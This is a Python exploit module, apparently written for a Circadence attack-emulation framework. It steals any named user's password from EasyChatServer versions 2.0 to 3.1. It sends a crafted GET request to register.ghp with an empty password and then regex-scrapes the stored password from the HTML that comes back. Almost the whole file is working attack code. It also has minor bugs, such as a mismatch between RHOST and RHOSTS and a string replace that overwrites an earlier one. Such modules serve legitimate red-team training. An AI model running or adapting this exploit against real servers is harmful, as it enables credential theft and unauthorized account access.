"""
    An exploit that is able to pull any users password from EasyChatServer
    versions 2.0 to 3.1.

    This module is based on the following: https://www.exploit-db.com/exploits/42153/

    @requires: C{host}: ip address of server running EasyChatServer
    @requires: C{username}: the username of which to find the corresponding password

"""
import re
import requests
from abstract_circadence_phase import AbstractCircadencePhase


class EasyChat(AbstractCircadencePhase):
    TrackerId = 'EasyChat'
    Subject = 'easychat_server_version_3.1_password_exfiltration_exploit'
    Description =   """
                    The 'EasyChat' phase extracts the password of a given
                    user located on an EasyChat server version 3.1
                    """

    required_input_parameters = {'RHOSTS': None, 'username': None}
    optional_input_parameters = {}
    output_parameters = {'password': None}

    def __init__(self, info):
        """
            Initialize the exploit.

            @param info: Initialization dictionary

            @requires: C{info} dictionary requires
                an I{'RHOST'} key as a string,
                and a I{'username'} key as a string.
        """
        AbstractCircadencePhase.__init__(self, info=info)

        assert 'RHOST' in info
        assert 'username' in info

    def Setup(self):
        """
            Initialize Phase arguments, must return True
        """
        self._rhost = self.PhaseResult['RHOST']
        self._username = self.PhaseResult['username']
        return True

    def Run(self):
        """
            Execute the stage.  Return when complete.
            Attack is run over port 80 of vulnerable host- also works over 443.

            @postcondition: C{self._state} dictionary contains
                I{password} key.
        """
        url = 'http://' + self._rhost + '/register.ghp?username=' + self._username + '&password='

        response = requests.get(url)

        html = response.content
        pattern = '<INPUT type="password" name="Password" maxlength="30"  value="(.+?)">'
        result = re.compile(pattern)
        password = re.findall(result, str(html))
        x = ''.join(password)

        password = x.replace("[", "")
        password = x.replace("]", "")

        assert password is not None and len(password) > 0

        self._progress = 100
        self.PhaseResult['password'] = password

        self.PhaseReporter.Info("user= {0}; password= {1}".format(self._username, password))
        return True


def create(info):
    """
        Create a new instance of the stage object.
        @return: instance of the stage object
    """
    return EasyChat(info)
